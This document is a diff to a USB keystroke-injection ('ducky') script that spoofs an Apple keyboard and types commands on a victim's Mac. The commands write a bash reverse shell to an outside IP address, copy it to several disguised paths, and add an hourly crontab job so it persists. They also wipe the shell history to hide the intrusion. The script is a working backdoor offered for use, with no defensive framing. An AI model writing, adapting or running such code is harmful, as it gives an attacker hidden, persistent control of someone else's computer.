@@ -1,4 +1,5 @@
-# This is a ducky script to create a reverse shell backdoor
+# This is a ducky script to create a reverse shell backdoor with cron job to keep alive.
+# You will need to click ok on the machine for crontab!
 
 USB_VID="0x05ac"        # Vendor ID
 USB_PID="0x027b"        # Product ID
@@ -19,9 +20,18 @@ function onKeyboardUp()
                 ENTER
                 DELAY 1500
                 STRING echo "#\!/bin/bash" > ~/app_support.sh && echo "bash -i >& /dev/tcp/206.189.215.73/3456 0>&1" >> ~/app_support.sh && chmod a+x ~/app_support.sh
-                DELAY 900
+                DELAY 1000
                 ENTER
                 DELAY 200
+                STRING cp ~/app_support.sh /tmp/; cp ~/app_support.sh ~/.ssh/rsa_pub_; mkdir -p ~/Library/.hidden && cp ~/app_support.sh ~/Library/.hidden/; cp ~/app_support.sh ~/Library/Python3.65; cp ~/app_support.sh /usr/local/bin/Python3.65;
+                DELAY 1250
+                ENTER
+                DELAY 200
+                STRING crontab -l | { cat; echo '0 * * * * ~/app_support.sh &>/dev/null || /tmp/app_support.sh &>/dev/null || ~/.ssh/rsa_pub_ &>/dev/null || ~/Library/.hidden/app_support.sh &>/dev/null || ~/Library/Python3.65 &>/dev/null || /usr/local/bin/Python3.65 &>/dev/null'; } | crontab -
+                DELAY 1500
+                ENTER
+                DELAY 2000
+                REM You will need to click ok on the machine for crontab!
                 STRING cd ~/ && ~/app_support.sh &; history -c && rm ~/.bash_history && disown && exit
                 DELAY 500
                 ENTER
